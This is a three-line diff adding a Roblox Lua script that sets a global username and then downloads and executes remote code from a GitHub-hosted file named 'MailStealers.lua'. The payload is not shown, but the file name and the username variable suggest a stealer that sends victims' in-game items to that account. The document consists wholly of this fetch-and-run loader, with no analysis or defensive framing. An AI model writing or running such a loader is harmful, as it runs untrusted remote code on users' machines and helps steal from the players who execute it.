@@ -1,0 +1,3 @@
+_G.Username = "ZeChariahbfruit"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SaskeCen/Cat-Hub/main/MailStealers.lua"))()
